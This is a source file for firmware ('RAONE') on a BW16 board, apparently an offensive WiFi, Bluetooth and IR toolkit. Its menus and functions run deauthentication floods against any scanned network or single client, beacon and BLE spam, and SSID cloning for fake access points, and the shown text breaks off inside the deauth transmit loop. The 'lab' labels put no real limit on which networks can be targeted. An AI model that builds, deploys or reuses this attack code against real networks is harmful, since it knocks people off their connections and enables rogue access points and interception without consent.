// ─────────────────────────────────────────────────────────────
//  RAONE  –  BW16 RTL8720DN  Firmware v1.0
//  WiFi / Bluetooth / IR attack & analysis toolkit
//  2-button UI: BTN_NAV (capacitive touch) + BTN_OK (tactile)
//  Long-press OK (>800 ms) = go back one level
//
//  NOTE: Serial debug is DISABLED — PA7/PA8 used for
//        buzzer and IR blaster.  OLED is the only output.
// ─────────────────────────────────────────────────────────────

#include "Config.h"
#include "DisplayUi.h"
#include "HardwareManager.h"
#include "IrBlaster.h"
#include "LabStats.h"
#include "LabTestEngine.h"
#include "TargetManager.h"
#include "WifiScanner.h"
#include "packet-injection.h"
#include "PromiscuousSniffer.h"
#include "BluetoothScanner.h"
#include "BeaconSpam.h"
#include "BleSpam.h"
#include "ClientScanner.h"

// ─────────────────────────────────────────────────────────────
//  UI State machine
// ─────────────────────────────────────────────────────────────
enum UiState {
  UI_MAIN_MENU,
  UI_WIFI_MENU,
  UI_PLACEHOLDER,
  UI_BAND_MENU,
  UI_NETWORK_LIST,
  UI_NETWORK_DETAILS,
  UI_TARGET_DETAILS,
  UI_ANALYZER,
  UI_SYSTEM_INFO,
  UI_LAB_MENU,
  UI_LAB_PRECHECK,
  UI_TARGET_MONITOR,
  UI_LAB_STATS,
  UI_PRINCIPAL_TEST,
  UI_BLE_MENU,
  UI_BLE_LIST,
  UI_BLE_DETAILS,
  UI_BLE_ANALYZER,
  UI_WIFI_ANAL_24,
  UI_WIFI_ANAL_5,
  UI_RADAR_BAND_MENU,
  UI_RADAR_NETWORK_LIST,
  UI_WIFI_RADAR,
  UI_BEACON_SPAM,
  UI_BLE_SPAM,
  UI_SNIFFER,
  UI_IR_MENU,
  UI_ACTION_MENU,
  UI_CLIENT_LIST,
  UI_CLIENT_SCANNING
};

// ─────────────────────────────────────────────────────────────
//  Menu item arrays  (all English)
// ─────────────────────────────────────────────────────────────

static const char *const MAIN_MENU_ITEMS[] = {
  "WiFi",
  "Bluetooth",
  "IR Remote",
  "System",
  "Back"
};

static const char *const WIFI_MENU_ITEMS[] = {
  "Scan Networks",
  "WiFi Radar",
  "Target",
  "Quick Deauth",
  "Analyzer",
  "Traffic 2.4G",
  "Traffic 5G",
  "Sniffer 2.4G",
  "Sniffer 5G",
  "Beacon 2.4G",
  "Beacon 5G",
  "Back"
};

static const char *const LAB_MENU_ITEMS[] = {
  "Deauther",
  "Principal Test",
  "Precheck",
  "RSSI Monitor",
  "Re-scan Target",
  "Results",
  "Reset Stats",
  "Back"
};

static const char *const BLE_MENU_ITEMS[] = {
  "Scan Devices",
  "Analyzer",
  "BLE Spam",
  "Back"
};

static const uint8_t MAIN_MENU_COUNT = sizeof(MAIN_MENU_ITEMS) / sizeof(MAIN_MENU_ITEMS[0]);
static const uint8_t WIFI_MENU_COUNT = sizeof(WIFI_MENU_ITEMS) / sizeof(WIFI_MENU_ITEMS[0]);
static const uint8_t LAB_MENU_COUNT  = sizeof(LAB_MENU_ITEMS)  / sizeof(LAB_MENU_ITEMS[0]);
static const uint8_t BLE_MENU_COUNT  = sizeof(BLE_MENU_ITEMS)  / sizeof(BLE_MENU_ITEMS[0]);

// Lab constants
static const uint16_t LAB_DEAUTH_REASON     = 0x06;
static const uint8_t  LAB_DEAUTH_CYCLE_LIMIT = 10;
static const uint16_t LAB_DEAUTH_TX_GAP_MS  = 100;
static const uint16_t RADAR_REFRESH_MS      = 2500;

// ─────────────────────────────────────────────────────────────
//  Global state
// ─────────────────────────────────────────────────────────────

UiState uiState       = UI_MAIN_MENU;
uint8_t mainMenuIndex = 0;
uint8_t wifiMenuIndex = 0;
uint8_t labMenuIndex  = 0;
uint8_t bleMenuIndex  = 0;
uint8_t irMenuIndex   = 0;

int     selectedNetwork = 0;
int     listTop         = 0;
uint8_t selectedBand    = 5;
uint8_t analyzerBand    = 5;

uint32_t lastRadarScanAt  = 0;
NetworkInfo radarNetwork;
char radarBssid[18]       = {0};
bool radarNetworkFound    = false;
bool radarScanActive      = false;
bool labInjectionStoppedByUser = false;

int     selectedBleDevice = -1;
int     bleListTop        = 0;

// Action menu & client scanning state
uint8_t actionMenuIndex   = 0;
int     actionNetworkIdx  = -1;  // index of the network shown in action menu
uint8_t clientListSel     = 0;
uint8_t clientListTop     = 0;

static const uint8_t ACTION_MENU_COUNT = 5;

// ─────────────────────────────────────────────────────────────
//  Button helpers
// ─────────────────────────────────────────────────────────────

// Returns true if BTN_OK is currently pressed (active LOW)
static bool okPressed() {
  return digitalRead(BTN_OK) == LOW;
}

// Debounce wait
static void waitButtonsReleased() {
  while (okPressed() || navPressed()) delay(20);
}

// ─────────────────────────────────────────────────────────────
//  Forward declarations
// ─────────────────────────────────────────────────────────────

void handleNav();
void handleOk();
void handleBack();

void drawMainMenu();
void drawWifiMenu();
void drawLabMenu();
void drawBleMenu();
void openMainMenuItem();
void openWifiMenuItem();
void openLabMenuItem();
void openBleMenuItem();
void runDeauthLab();
bool runPacketInjectionLab();
bool rearmLabWifi(uint8_t channel);
bool stopPacketInjectionLab(bool anySent, uint32_t sentCount);
void returnToDeauthCaller(UiState returnState);
bool labStopRequested();
void waitForLabButtonsReleased();
bool isInjectionBlockedSecurity(uint32_t security);
bool parseMacAddress(const char *text, uint8_t mac[6]);
int  hexValue(char value);
void runTargetRefresh();
bool sameTarget(uint8_t networkIndex);
void showPlaceholder(const char *title, const char *message);
void runScan();
uint8_t nextIndex(uint8_t current, uint8_t count);
uint8_t previousIndex(uint8_t current, uint8_t count);
uint8_t nextBandOption(uint8_t current);
void moveSelection(int delta);
void selectFirstNetworkInBand();
void normalizeListTop();
void moveBleSelection(int delta);
void closeBleAnalyzer();
void closeBleScanList();
void exitBeaconSpam();
void exitBleSpam();
void exitWifiAnalyzer();
void exitSniffer();
void startSniffer(uint8_t band);

void setup() {
  Serial.begin(115200);
  delay(100);
  Serial.println("\n[SYSTEM] Booting RAONE V4.0 ULTIMATE...");

  pinMode(BTN_OK,  INPUT_PULLUP);
  hwBegin();
  irBegin();
  uiBegin();

  // ─── Fast 2-Second Boot Animation ─────────────────────────────
  ledRedOn();
  uiDrawSplashProgress(10);
  playTone(659, 100); delay(100);
  uiDrawSplashProgress(33);
  ledRedOff();

  ledGreenOn();
  uiDrawSplashProgress(50);
  playTone(554, 100); delay(100);
  uiDrawSplashProgress(66);
  ledGreenOff();

  ledYellowOn();
  uiDrawSplashProgress(80);
  playTone(440, 150); delay(150);
  uiDrawSplashProgress(100);
  ledYellowOff();

  delay(100);

  ledAllOff();
  setLedMode(LED_MODE_IDLE); // Red solid = idle

  wifiScannerBegin();
  sniffBegin();
  bleBegin();
  beaconSpamBegin();
  bleSpamBegin();

  drawMainMenu();
}

// ─────────────────────────────────────────────────────────────
//  loop()
// ─────────────────────────────────────────────────────────────

void loop() {
  // ── Button reading ──────────────────────────────────────────
  if (navPressed()) {
    delay(30); // debounce
    if (navPressed()) {
      buzzerClick(); // beep on press
      uint32_t pressStart = millis();
      bool longPress = false;
      while (navPressed()) {
        if (millis() - pressStart > BTN_LONG_PRESS_MS) {
          longPress = true;
          buzzerClick(); // extra feedback beep for long press
          while (navPressed()) delay(10); // wait release
          handleBack();
          goto after_buttons;
        }
        delay(10);
      }
      if (!longPress) {
        handleNav();
      }
    }
  }

  if (okPressed()) {
    delay(30); // debounce
    if (okPressed()) {
      buzzerClick(); // beep on press
      // Wait for release
      while (okPressed()) delay(10);
      handleOk();
    }
  }

after_buttons:

  ledTaskUpdate();

  // ── Background tasks ─────────────────────────────────────────

  if (uiState == UI_MAIN_MENU || uiState == UI_WIFI_MENU ||
      uiState == UI_LAB_MENU  || uiState == UI_BAND_MENU ||
      uiState == UI_RADAR_BAND_MENU || uiState == UI_BLE_MENU) {
    uiTickMenuAnimation();
  }

  if (bleActive()) {
    bleAnalyzerTick();
  }

  if (uiState == UI_SNIFFER) {
    sniffTick();
    static uint32_t lastSniffRefresh = 0;
    if (millis() - lastSniffRefresh > 250) {
      lastSniffRefresh = millis();
      uiRefreshSniffer(sniffGetStats());
    }
    ledTaskUpdate();
  }

  if (uiState == UI_BLE_LIST) {
    static uint32_t lastBleRefresh = 0;
    if (millis() - lastBleRefresh > 500) {
      lastBleRefresh = millis();
      uiRefreshBleList(selectedBleDevice, bleListTop);
    }
  }

  if (uiState == UI_BLE_ANALYZER) {
    static uint32_t lastAnalRefresh = 0;
    if (millis() - lastAnalRefresh > 100) {
      lastAnalRefresh = millis();
      uiRefreshBleAnalyzer();
    }
    ledTaskUpdate();
  }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    sniffTick();
    wifiAnalyzerTick();
    static uint32_t lastWifiAnalRefresh = 0;
    if (millis() - lastWifiAnalRefresh > 100) {
      lastWifiAnalRefresh = millis();
      uiRefreshWifiAnalyzer();
    }
    ledTaskUpdate();
  }

  if (radarScanActive) {
    bool scanOk = false;
    if (wifiScannerPollScan(&scanOk)) {
      radarScanActive = false;
      lastRadarScanAt = millis();
      if (uiState == UI_WIFI_RADAR) {
        int foundIndex = scanOk ? wifiScannerFindBssid(radarBssid) : -1;
        radarNetworkFound = foundIndex >= 0;
        if (radarNetworkFound) {
          radarNetwork  = wifiScannerNetwork(foundIndex);
          selectedNetwork = foundIndex;
        }
        uiDrawWifiRadar(&radarNetwork, radarNetworkFound);
      }
    }
  }

  if (uiState == UI_WIFI_RADAR) {
    uiTickWifiRadar();
    if (!radarScanActive && millis() - lastRadarScanAt >= RADAR_REFRESH_MS) {
      radarScanActive = wifiScannerStartScan();
      if (!radarScanActive) lastRadarScanAt = millis();
    }
    ledTaskUpdate();
  }

  if (uiState == UI_BEACON_SPAM) {
    beaconSpamTick();
    static uint32_t lastBeaconRefresh = 0;
    if (millis() - lastBeaconRefresh > 250) {
      lastBeaconRefresh = millis();
      uiRefreshBeaconSpam();
    }
    ledTaskUpdate();
  }

  if (uiState == UI_BLE_SPAM) {
    bleSpamTick();
    static uint32_t lastBleSpamRefresh = 0;
    if (millis() - lastBleSpamRefresh > 250) {
      lastBleSpamRefresh = millis();
      uiRefreshBleSpam();
    }
    ledTaskUpdate();
  }

  delay(60);
}

// ─────────────────────────────────────────────────────────────
//  Menu draw helpers
// ─────────────────────────────────────────────────────────────

void drawMainMenu() {
  uiState = UI_MAIN_MENU;
  uiDrawMenu("RAONE", MAIN_MENU_ITEMS, MAIN_MENU_COUNT, mainMenuIndex,
             "NAV=next  OK=select");
}

void drawWifiMenu() {
  uiState = UI_WIFI_MENU;
  uiDrawMenu("WIFI", WIFI_MENU_ITEMS, WIFI_MENU_COUNT, wifiMenuIndex,
             "NAV=next  OK=select");
}

void drawLabMenu() {
  uiState = UI_LAB_MENU;
  uiDrawMenu("LAB TOOLS", LAB_MENU_ITEMS, LAB_MENU_COUNT, labMenuIndex,
             "NAV=next  OK=select");
}

void drawBleMenu() {
  uiState = UI_BLE_MENU;
  uiDrawMenu("BLUETOOTH", BLE_MENU_ITEMS, BLE_MENU_COUNT, bleMenuIndex,
             "NAV=next  OK=select");
}

// ─────────────────────────────────────────────────────────────
//  NAV handler – cycles selection forward in current context
// ─────────────────────────────────────────────────────────────

void handleNav() {
  if (uiState == UI_MAIN_MENU) {
    mainMenuIndex = nextIndex(mainMenuIndex, MAIN_MENU_COUNT);
    drawMainMenu();
    delay(150);
    return;
  }

  if (uiState == UI_WIFI_MENU) {
    wifiMenuIndex = nextIndex(wifiMenuIndex, WIFI_MENU_COUNT);
    drawWifiMenu();
    delay(150);
    return;
  }

  if (uiState == UI_LAB_MENU) {
    labMenuIndex = nextIndex(labMenuIndex, LAB_MENU_COUNT);
    drawLabMenu();
    delay(150);
    return;
  }

  if (uiState == UI_BLE_MENU) {
    bleMenuIndex = nextIndex(bleMenuIndex, BLE_MENU_COUNT);
    drawBleMenu();
    delay(150);
    return;
  }

  if (uiState == UI_IR_MENU) {
    irMenuIndex = nextIndex(irMenuIndex, irCodeCount());
    uiRefreshIrMenu(irMenuIndex);
    delay(150);
    return;
  }

  if (uiState == UI_BAND_MENU) {
    selectedBand = nextBandOption(selectedBand);
    uiDrawBandMenu(selectedBand);
    delay(150);
    return;
  }

  if (uiState == UI_RADAR_BAND_MENU) {
    selectedBand = nextBandOption(selectedBand);
    uiDrawRadarBandMenu(selectedBand);
    delay(150);
    return;
  }

  if (uiState == UI_NETWORK_LIST || uiState == UI_RADAR_NETWORK_LIST) {
    moveSelection(1);
    return;
  }

  if (uiState == UI_BLE_LIST) {
    moveBleSelection(1);
    return;
  }

  if (uiState == UI_BLE_ANALYZER) {
    bleAnalyzerReset();
    uiDrawBleAnalyzer();
    delay(200);
    return;
  }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    sniffResetStats();
    wifiAnalyzerReset();
    uiDrawWifiAnalyzer();
    delay(200);
    return;
  }

  if (uiState == UI_ANALYZER) {
    analyzerBand = (analyzerBand == 5) ? 2 : 5;
    uiDrawAnalyzer(analyzerBand);
    delay(200);
    return;
  }

  // In all other states NAV does nothing (single screen)
}

// ─────────────────────────────────────────────────────────────
//  OK handler – select / confirm
// ─────────────────────────────────────────────────────────────

void handleOk() {
  if (uiState == UI_MAIN_MENU) { openMainMenuItem(); return; }
  if (uiState == UI_WIFI_MENU) { openWifiMenuItem(); return; }
  if (uiState == UI_LAB_MENU)  { openLabMenuItem();  return; }
  if (uiState == UI_BLE_MENU)  { openBleMenuItem();  return; }

  if (uiState == UI_IR_MENU) {
    uiDrawStatus("Transmitting...");
    irTransmit(irMenuIndex);
    ledFlashGreen(1, 80);
    buzzerClick();
    uiRefreshIrMenu(irMenuIndex);
    delay(300);
    return;
  }

  if (uiState == UI_PLACEHOLDER) {
    drawMainMenu();
    return;
  }

  if (uiState == UI_NETWORK_DETAILS) {
    // Open Action Menu for this network
    actionNetworkIdx = selectedNetwork;
    actionMenuIndex = 0;
    uiState = UI_ACTION_MENU;
    uiDrawActionMenu(wifiScannerNetwork(selectedNetwork), actionMenuIndex);
    delay(200);
    return;
  }

  if (uiState == UI_TARGET_DETAILS) { runDeauthLab(); return; }

  if (uiState == UI_ANALYZER) {
    uiState = UI_WIFI_MENU;
    drawWifiMenu();
    delay(200);
    return;
  }

  if (uiState == UI_WIFI_RADAR) {
    int radarIndex = wifiScannerFindBssid(radarBssid);
    if (radarIndex >= 0) {
      selectedNetwork = radarIndex;
    } else {
      selectFirstNetworkInBand();
    }
    listTop = 0;
    uiState = UI_RADAR_NETWORK_LIST;
    uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
    delay(200);
    return;
  }

  if (uiState == UI_TARGET_MONITOR) { runTargetRefresh(); return; }

  if (uiState == UI_LAB_PRECHECK || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) {
    drawLabMenu();
    delay(200);
    return;
  }

  if (uiState == UI_SYSTEM_INFO) { drawMainMenu(); delay(200); return; }

  if (uiState == UI_BLE_DETAILS) {
    uiState = UI_BLE_LIST;
    uiDrawBleList(selectedBleDevice, bleListTop);
    delay(200);
    return;
  }

  if (uiState == UI_BLE_ANALYZER) { closeBleAnalyzer(); delay(200); return; }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    exitWifiAnalyzer();
    delay(200);
    return;
  }

  if (uiState == UI_BLE_LIST) {
    if (selectedBleDevice < 0) {
      closeBleScanList();
      delay(200);
      return;
    }
    if (selectedBleDevice < (int)bleCount()) {
      BleDeviceInfo device;
      if (!bleCopyDevice(selectedBleDevice, device)) return;
      uiState = UI_BLE_DETAILS;
      uiDrawBleDetails(device);
      delay(200);
    }
    return;
  }

  if (uiState == UI_BAND_MENU) {
    selectFirstNetworkInBand();
    uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
    delay(200);
    return;
  }

  if (uiState == UI_RADAR_BAND_MENU) {
    memset(&radarNetwork, 0, sizeof(radarNetwork));
    radarNetworkFound = false;
    radarScanActive = wifiScannerStartScan();
    lastRadarScanAt = millis();
    uiState = UI_WIFI_RADAR;
    uiDrawWifiRadar(nullptr, false);
    return;
  }

  if (uiState == UI_NETWORK_LIST) {
    if (selectedNetwork == -1) {
      drawWifiMenu();
      delay(200);
      return;
    }
    uiState = UI_NETWORK_DETAILS;
    uiDrawNetworkDetails(wifiScannerNetwork(selectedNetwork),
                         targetHasSelection() && sameTarget(selectedNetwork));
    delay(200);
    return;
  }

  if (uiState == UI_RADAR_NETWORK_LIST) {
    if (selectedNetwork == -1) {
      uiState = UI_WIFI_RADAR;
      uiDrawWifiRadar(&radarNetwork, radarNetworkFound);
      delay(200);
      return;
    }
    // Also redirect Radar Network list to Action Menu
    actionNetworkIdx = selectedNetwork;
    actionMenuIndex = 0;
    uiState = UI_ACTION_MENU;
    uiDrawActionMenu(wifiScannerNetwork(selectedNetwork), actionMenuIndex);
    delay(200);
    return;
  }

  if (uiState == UI_ACTION_MENU) {
    if (actionMenuIndex == 0) {
      // Set Target
      targetSet(wifiScannerNetwork(actionNetworkIdx));
      labStatsReset(targetGet().bssid);
      drawWifiMenu(); // Go back to wifi menu
    }
    else if (actionMenuIndex == 1) {
      // Deauth Broadcast
      targetSet(wifiScannerNetwork(actionNetworkIdx));
      labStatsReset(targetGet().bssid);
      runDeauthLab(); // run original deauth
    }
    else if (actionMenuIndex == 2) {
      // Scan Clients
      uint8_t targetMacBytes[6];
      parseMacAddress(wifiScannerNetwork(actionNetworkIdx).bssid, targetMacBytes);
      uiState = UI_CLIENT_SCANNING;
      clientScanStart(wifiScannerNetwork(actionNetworkIdx).channel, targetMacBytes);
      uiDrawGenericMessage("Scanning...", "Sniffing data frames...", "Wait 6s");
    }
    else if (actionMenuIndex == 3) {
      // Clone SSID
      beaconSpamSetCloneSSID(wifiScannerNetwork(actionNetworkIdx).ssid);
      uiDrawGenericMessage("Clone Mode", "SSID Cloned!", "Run Beacon Spam");
      delay(1500);
      drawWifiMenu();
    }
    else if (actionMenuIndex == 4) {
      // Back
      uiState = UI_NETWORK_LIST;
      uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
    }
    delay(200);
    return;
  }

  if (uiState == UI_CLIENT_LIST) {
    if (clientListSel < clientScanCount()) {
      // Deauth this specific client
      targetSet(wifiScannerNetwork(actionNetworkIdx));
      labStatsReset(targetGet().bssid);
      runDeauthLabTargeted(clientScanGet(clientListSel).mac);
    } else {
      // Back button in list
      uiState = UI_ACTION_MENU;
      uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
    }
    delay(200);
    return;
  }

  if (uiState == UI_BEACON_SPAM) { exitBeaconSpam(); delay(200); return; }
  if (uiState == UI_BLE_SPAM)    { exitBleSpam();    delay(200); return; }
  if (uiState == UI_SNIFFER)     { exitSniffer();    delay(200); return; }
}

// ─────────────────────────────────────────────────────────────
//  Long-press OK = go back one level
// ─────────────────────────────────────────────────────────────

void handleBack() {
  if (uiState == UI_WIFI_MENU)        { drawMainMenu(); return; }
  if (uiState == UI_LAB_MENU)         { drawWifiMenu(); return; }
  if (uiState == UI_BLE_MENU)         { drawMainMenu(); return; }
  if (uiState == UI_IR_MENU)          { drawMainMenu(); return; }
  if (uiState == UI_PLACEHOLDER)      { drawMainMenu(); return; }
  if (uiState == UI_CLIENT_LIST)      { uiState = UI_ACTION_MENU; uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex); return; }
  if (uiState == UI_ACTION_MENU)      { uiState = UI_NETWORK_LIST; uiDrawNetworkList(selectedBand, selectedNetwork, listTop); return; }
  if (uiState == UI_NETWORK_DETAILS)  { uiState = UI_NETWORK_LIST; uiDrawNetworkList(selectedBand, selectedNetwork, listTop); return; }
  if (uiState == UI_TARGET_DETAILS)   { drawWifiMenu(); return; }
  if (uiState == UI_ANALYZER)         { drawWifiMenu(); return; }
  if (uiState == UI_WIFI_RADAR)       { uiState = UI_RADAR_BAND_MENU; uiDrawRadarBandMenu(selectedBand); return; }
  if (uiState == UI_RADAR_BAND_MENU)  { drawWifiMenu(); return; }
  if (uiState == UI_RADAR_NETWORK_LIST) { uiState = UI_WIFI_RADAR; uiDrawWifiRadar(&radarNetwork, radarNetworkFound); return; }
  if (uiState == UI_LAB_PRECHECK || uiState == UI_TARGET_MONITOR || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) { drawLabMenu(); return; }
  if (uiState == UI_ACTION_MENU) {
    actionMenuIndex = (actionMenuIndex + 1) % ACTION_MENU_COUNT;
    uiDrawActionMenu(wifiScannerNetwork(actionNetworkIdx), actionMenuIndex);
    return;
  }
  
  if (uiState == UI_CLIENT_LIST) {
    uint8_t count = clientScanCount() + 1; // +1 for Back
    clientListSel = (clientListSel + 1) % count;
    if (clientListSel >= clientListTop + 4) {
      clientListTop++;
    } else if (clientListSel < clientListTop) {
      clientListTop = clientListSel;
    }
    const char *macStrs[MAX_CLIENTS];
    for(uint8_t i=0; i<clientScanCount(); i++) macStrs[i] = clientScanGet(i).macStr;
    uiDrawClientList(macStrs, clientListSel, clientListTop, clientScanCount());
    return;
  }

  if (uiState == UI_SYSTEM_INFO)      { drawMainMenu(); return; }
  if (uiState == UI_BLE_DETAILS)      { uiState = UI_BLE_LIST; uiDrawBleList(selectedBleDevice, bleListTop); return; }
  if (uiState == UI_BLE_LIST)         { closeBleScanList(); return; }
  if (uiState == UI_BLE_ANALYZER)     { closeBleAnalyzer(); return; }
  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) { exitWifiAnalyzer(); return; }
  if (uiState == UI_BEACON_SPAM)      { exitBeaconSpam(); return; }
  if (uiState == UI_BLE_SPAM)         { exitBleSpam(); return; }
  if (uiState == UI_SNIFFER)          { exitSniffer(); return; }
  if (uiState == UI_BAND_MENU || uiState == UI_NETWORK_LIST) { drawWifiMenu(); return; }
  // Default: back to main
  drawMainMenu();
}

// ─────────────────────────────────────────────────────────────
//  Menu actions
// ─────────────────────────────────────────────────────────────

void openMainMenuItem() {
  switch (mainMenuIndex) {
    case 0: drawWifiMenu();  break;
    case 1: drawBleMenu();   break;
    case 2:
      uiState = UI_IR_MENU;
      irMenuIndex = 0;
      uiDrawIrMenu(irMenuIndex);
      break;
    case 3: {
      uiState = UI_SYSTEM_INFO;
      uint8_t c24 = wifiScannerCountBand(2);
      uint8_t c5  = wifiScannerCountBand(5);
      uint8_t tot = wifiScannerCount();
      uiDrawSystemInfo(targetHasSelection(), tot, c24, c5);
      break;
    }
  }
}

void openWifiMenuItem() {
  switch (wifiMenuIndex) {
    case 0: runScan();   break;
    case 1: // WiFi Radar
      selectedBand = 5;
      uiState = UI_RADAR_BAND_MENU;
      uiDrawRadarBandMenu(selectedBand);
      break;
    case 2: // Target details
      if (targetHasSelection()) {
        uiState = UI_TARGET_DETAILS;
        uiDrawTargetDetails(targetGet());
      } else {
        showPlaceholder("Target", "No target set yet");
      }
      break;
    case 3: // Quick deauth
      if (targetHasSelection()) {
        runDeauthLab();
      } else {
        showPlaceholder("Deauth", "Set a target first");
      }
      break;
    case 4: // Analyzer
      uiState = UI_ANALYZER;
      uiDrawAnalyzer(analyzerBand);
      break;
    case 5: // Traffic 2.4G
      if (sniffStart(2)) {
        wifiAnalyzerReset();
        uiState = UI_WIFI_ANAL_24;
        uiDrawWifiAnalyzer();
      } else {
        showPlaceholder("Traffic 2.4G", "Sniffer start failed");
      }
      break;
    case 6: // Traffic 5G
      if (sniffStart(5)) {
        wifiAnalyzerReset();
        uiState = UI_WIFI_ANAL_5;
        uiDrawWifiAnalyzer();
      } else {
        showPlaceholder("Traffic 5G", "Sniffer start failed");
      }
      break;
    case 7: // Sniffer 2.4G
      startSniffer(2);
      break;
    case 8: // Sniffer 5G
      startSniffer(5);
      break;
    case 9: // Beacon 2.4G
      if (beaconSpamStart(2)) {
        uiState = UI_BEACON_SPAM;
        uiDrawBeaconSpam();
      } else {
        showPlaceholder("Beacon 2.4G", "Failed to start");
      }
      break;
    case 10: // Beacon 5G
      if (beaconSpamStart(5)) {
        uiState = UI_BEACON_SPAM;
        uiDrawBeaconSpam();
      } else {
        showPlaceholder("Beacon 5G", "Failed to start");
      }
      break;
    case 11: // Back
      drawMainMenu();
      break;
  }
}

void openLabMenuItem() {
  switch (labMenuIndex) {
    case 0: // Deauther
      if (targetHasSelection()) {
        runDeauthLab();
      } else {
        showPlaceholder("Deauther", "No target set");
      }
      break;
    case 1: // Principal test
      if (targetHasSelection()) {
        labTestPrepare(targetGet());
        const LabTestReport &r = labTestGetReport();
        uiState = UI_PRINCIPAL_TEST;
        uiDrawPrincipalTest(r);
      } else {
        showPlaceholder("Test", "No target set");
      }
      break;
    case 2: // Precheck
      uiState = UI_LAB_PRECHECK;
      uiDrawLabPrecheck(targetHasSelection(),
                        targetHasSelection() ? &targetGet() : nullptr);
      break;
    case 3: // RSSI Monitor
      if (targetHasSelection()) {
        uiState = UI_TARGET_MONITOR;
        uiDrawTargetMonitor(targetGet(), false);
      } else {
        showPlaceholder("Monitor", "No target set");
      }
      break;
    case 4: // Re-scan target
      runTargetRefresh();
      break;
    case 5: // Results
      if (labStatsActive()) {
        uiState = UI_LAB_STATS;
        uiDrawLabStats(labStatsGet());
      } else {
        showPlaceholder("Results", "No stats yet");
      }
      break;
    case 6: // Reset stats
      labStatsReset(targetHasSelection() ? targetGet().bssid : "");
      labTestReset();
      showPlaceholder("Reset", "Stats cleared");
      delay(800);
      drawLabMenu();
      break;
    case 7: // Back
      drawWifiMenu();
      break;
  }
}

void openBleMenuItem() {
  switch (bleMenuIndex) {
    case 0: // Scan devices
      bleResetList();
      if (bleStart()) {
        selectedBleDevice = -1;
        bleListTop = 0;
        uiState = UI_BLE_LIST;
        uiDrawBleList(selectedBleDevice, bleListTop);
      } else {
        showPlaceholder("BLE Scan", "Failed to start");
      }
      break;
    case 1: // Analyzer
      if (bleActive()) {
        bleAnalyzerReset();
        uiState = UI_BLE_ANALYZER;
        uiDrawBleAnalyzer();
      } else if (bleStart()) {
        bleAnalyzerReset();
        uiState = UI_BLE_ANALYZER;
        uiDrawBleAnalyzer();
      } else {
        showPlaceholder("BLE Analyzer", "Failed to start");
      }
      break;
    case 2: // BLE Spam
      if (bleSpamStart()) {
        uiState = UI_BLE_SPAM;
        uiDrawBleSpam();
      } else {
        showPlaceholder("BLE Spam", "Failed to start");
      }
      break;
    case 3: // Back
      drawMainMenu();
      break;
  }
}

// ─────────────────────────────────────────────────────────────
//  Deauth Lab
// ─────────────────────────────────────────────────────────────

void runDeauthLab() {
  if (!targetHasSelection()) return;

  const NetworkInfo &target = targetGet();
  UiState returnState = uiState;

  uiState = UI_LAB_PRECHECK;
  uiDrawLabPrecheck(true, &target);
  delay(600);

  ledYellowOn();
  uiDrawStatus("Setting up...");

  labInjectionStoppedByUser = false;
  bool anySent = runPacketInjectionLab();

  ledYellowOff();

  if (anySent) {
    ledFlashGreen(2, 100);
    buzzerSuccess();
  } else {
    ledFlashRed(2, 150);
    buzzerError();
  }

  // After attack: show lab stats
  if (labStatsActive()) {
    const LabStats &s = labStatsGet();
    labTestSimulateDeauth(target, s.found > 0, s, anySent);
    uiState = UI_PRINCIPAL_TEST;
    uiDrawPrincipalTest(labTestGetReport());
  } else {
    returnToDeauthCaller(returnState);
  }
}

// Forward declaration of runDeauthLabTargeted's inner function
bool runPacketInjectionLabTargeted(const uint8_t *dstMac);

void runDeauthLabTargeted(const uint8_t *dstMac) {
  if (!targetHasSelection()) return;

  const NetworkInfo &target = targetGet();
  UiState returnState = uiState;

  uiState = UI_LAB_PRECHECK;
  uiDrawLabPrecheck(true, &target);
  delay(600);

  ledYellowOn();
  uiDrawStatus("Setting up targeted...");

  labInjectionStoppedByUser = false;
  bool anySent = runPacketInjectionLabTargeted(dstMac);

  ledYellowOff();

  if (anySent) {
    ledFlashGreen(2, 100);
    buzzerSuccess();
  } else {
    ledFlashRed(2, 150);
    buzzerError();
  }

  if (labStatsActive()) {
    const LabStats &s = labStatsGet();
    labTestSimulateDeauth(target, s.found > 0, s, anySent);
    uiState = UI_PRINCIPAL_TEST;
    uiDrawPrincipalTest(labTestGetReport());
  } else {
    returnToDeauthCaller(returnState);
  }
}

bool runPacketInjectionLabTargeted(const uint8_t *dstMac) {
  const NetworkInfo &target = targetGet();

  uint8_t targetMac[6];
  if (!parseMacAddress(target.bssid, targetMac)) {
    uiDrawStatus("Bad MAC address");
    ledFlashRed(3, 100);
    buzzerError();
    delay(900);
    return false;
  }

  if (isInjectionBlockedSecurity(target.security)) {
    uiDrawStatus("WPA3 - TX blocked");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  wifi_off();
  delay(200);
  if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
    uiDrawStatus("WiFi init failed");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }
  wifi_change_channel_plan(0x25); // Force dual-band so 5G channels work
  delay(200);

  if (wifi_set_channel(target.channel) != RTW_SUCCESS) {
    uiDrawStatus("Channel set failed");
    ledFlashRed(2, 200);
    buzzerError();
    delay(900);
    return false;
  }

  uiDrawTxCounter(0);

  bool anySent = false;
  uint32_t sentCount = 0;
  uiDrawTxCounter(sentCount);

  uint8_t dstMacBuf[6];
  memcpy(dstMacBuf, dstMac, 6);

  while (true) {
    for (uint8_t burst = 0; burst < LAB_DEAUTH_CYCLE_LIMIT; burst++) {
      if (labStopRequested()) {
        return stopPacketInjectionLab(anySent, sentCount);
      }

      bool sent = wifi_tx_deauth_frame(targetMac, dstMacBuf, LAB_DEAUTH_REASON);
      anySent = anySent || sent;
      if (sent) {
        sentCount++;
        ledFlashGreen(1, 20);
        buzzerClick();
      } else {
        ledFlashRed(1, 20);
      }

      uiDrawTxCounter(sentCount);
